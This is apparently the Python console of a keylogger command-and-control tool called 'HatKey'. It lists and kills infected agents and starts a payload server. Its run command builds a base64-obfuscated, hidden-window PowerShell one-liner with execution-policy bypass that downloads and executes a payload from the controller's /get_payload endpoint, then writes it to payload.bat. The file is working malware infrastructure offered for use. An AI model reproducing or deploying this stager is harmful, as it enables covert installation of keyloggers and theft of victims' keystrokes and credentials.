import sys
import os
import time
import threading
import base64
import re
from Lib import web
from Lib import prettytable
from System import Banner
from System import Global
from System.Server import server

class Command:
	COMMANDS 	= ['exit','show','help','set','run','list','kill']
	HELPCOMMANDS	= [
		['exit','Exit the console'],
		['list','List all agents'],
		['kill','Kill an agent'],
		['run','Run Command and Controler'],
		['help','Help menu'],
		['set','Sets a variable to a value'],
		['show','Show Command and Controler variables']
	]

	def help(self,args=None):
		table = prettytable.PrettyTable(['Command','Description'])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*7,'-'*11])
		for i in self.HELPCOMMANDS:
			table.add_row([i[0],i[1]])
		print (table)

	def exit(self,args=None):
		os._exit(0)

	def list(self,args=None):
		table 	 = prettytable.PrettyTable(['ID','IP', 'Username'])
		table.border = False
		table.align  = 'l'
		table.add_row(['-'*2,'-'*2,'-'*8])
		for i in Global.AGENTS:
			j = re.search(r'^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})*', i).group()
			table.add_row([i,j,i[len(j)+1:]])
		print (table)

	def kill(self,args):
		if(len(args) < 2):
			return None
		if(args[1] in Global.AGENTS):
			Global.AGENTS.remove(args[1])

	def run(self,args=None):
		flag = True
		for i in options:
			if(options[i][1] and options[i][0] == ''):
				print ('[-]' + ' set ' + i)
				flag = False
		if(flag):
			print ('[+] Server start on: ' + ("http://%s:%s/")%(options['host'][0],options['port'][0]))
			threading.Thread(target=server, args=(options['port'][0],options['host'][0],)).start()
			time.sleep(1)
			data_string = '(New-Object Net.WebClient).DownloadString("http://%s:%s/get_payload")' % (options['host'][0], options['port'][0]) #string à convertir en bytes
			data_bytes = data_string.encode("utf-8") #Bytes à passer dans la commande
			final_data = str(base64.b64encode(data_bytes))
			final_data = final_data.replace("b'", "") #Remove the Byte symbol in the beginning of the string
			final_data = final_data.replace("'", "") #Remove the last quote
			command = "powershell -exec bypass -WindowStyle Hidden IEX(IEX(\"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" + final_data + "'))\"))"
			print ('[+] Keylogger launcher is: ' + '\n' + command)
			#-----Création du fichier bat-----
			file = open("payload.bat", "w")
			file.write(command)
			file.close()
			print ('[+] Payload Successfuly Generated in Root Folder')
			

	def set(self,args):
		if(len(args) < 2):
			return None
		if(args[1] in options):
			options[args[1]][0] = args[2]

	def show(self,args=None):
		table = prettytable.PrettyTable(['Name', 'Current Setting', 'Required', 'Description'])
		table.border = False
		table.align = 'l'
		table.add_row(['-'*4,'-'*15,'-'*8,'-'*11])
		for i in options:
			table.add_row([i, options[i][0], options[i][1], options[i][2]])
				
		print (table)

agents	= list()
options = {
	'port'		:['8080'	,True	,'The Command and Controler port'],
	'host'		:['127.0.0.1'		,True	,'The Command and Controler IP address']
	}


def main():
	Banner.Banner()
	Command().help()
	while True:
		u_input = input('HatKey > ').strip().split() #User Input
		if(u_input):
			if(u_input[0] in Command.COMMANDS):
				result = getattr(globals()['Command'](),u_input[0])(u_input)	

main()
